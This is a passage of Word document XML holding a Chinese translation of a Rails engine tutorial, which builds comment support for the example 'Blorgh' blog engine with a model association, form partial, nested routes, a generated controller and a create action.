              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Blorgh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="702539B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class</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Post &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F23CB1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has_many :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B321DD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p w14:paraId="4CAEE88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60C6C0F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因为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模块中的一个类中定义，Rails 将会知道你希望对 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::Comment</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的对象使用，因此这里没有必要指定使用的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:class_name</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E5337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接下来，需要一个 ‘form’ 使得可以在一篇文章中创建评论。添加这些，在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>render @post.comments</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用下面加入如下行：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1EE65954" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4AF472D6" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2107462809"/>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render "blorgh/comments/form"</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05FDC05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接下来，需要有这行 ‘render’ 的 ‘partial’ 存在。在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/blorgh/comments</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 创建一个新目录并且里面一个新文件叫做 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>_form.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 其有这样的内容来创建 partial require：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1E01B691" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72C86E6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&lt;h3&gt;New comment&lt;/h3&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E3FF9A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form_for [@post, @post.comments.build] do</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|f| %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="475930F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&lt;p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43B76D0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w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.label :text</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;&lt;br</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6EDDCF4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w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.text_area :text</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4E66943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&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="504FDFC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w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>f.submit %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="23480C0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end</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42C5AC9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当这个 ‘form’ 被提交，它尝试执行一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 请求到 engine 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/posts/:post_id/comments</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 路由。这个路由现在不存在，但是能给通过改变 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resources :posts</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2760"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="156BB264" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="347B2DD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resources :posts</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="749A7D2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resources :comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65C0182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5FA7637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这里为评论创建一个嵌套的路由，它是 ‘form’ 请求的（路由）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339FD4D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路由存在了，但是这个路由的控制器还没有。要创建它，运行这个命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="48D956C8" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15B48184" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1788890373"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails g controller comments</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="54E3087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这将创建随后的事情：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7800"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="2E4086C2" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24C917A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app/controllers/blorgh/comments_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="519D014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erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F47406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exist    app/views/blorgh/comments</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B7DDAE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test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6643879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test/functional/blorgh/comments_controller_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47B5841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helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="199A720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app/helpers/blorgh/comments_helper.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55163FE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test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="519F53D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test/unit/helpers/blorgh/comments_helper_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="685F684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assets</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F2FF5C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js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DF3F36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app/assets/javascripts/blorgh/comments.js</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72CCE39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invoke    css</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39452F9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create      app/assets/stylesheets/blorgh/comments.css</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7C7E897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‘form’ 将会生成一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 请求到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/posts/:post_id/comments</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，其将会对应于 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Blorgh::CommentsController</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 动作。这个动作需要创建并通过放置下面行到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/controllers/blorgh/comments_controller.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 类定义中使之生效：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="13111C56" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D6C243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def</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>create</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58B5722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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.find(params[:post_id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43E8E96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@comment</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= @post.comments.build(params[:comment])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="595001B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flash[:notice] = "Comment has been created!"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D5DD03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redirect_to post_path</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="430ADEC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1278D0E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这是使得新评论 ‘form’ 工作的最后部分。显示评论，无论如何，这里不是十分正确。如果你现在创建一个评论你将会看到这样的错误：</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23024FA9" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3FF2261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Missing partial blorgh/comments/comment with {:handlers=&gt;[:erb, :builder], :formats=&gt;[:html], :locale=&gt;[:en, :en]}. Searched in:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47AB74A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"/Users/ryan/Sites/side_projects/blorgh/test/dummy/app/views"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17A7FF8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"/Users/ryan/Sites/side_projects/blorgh/app/views"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
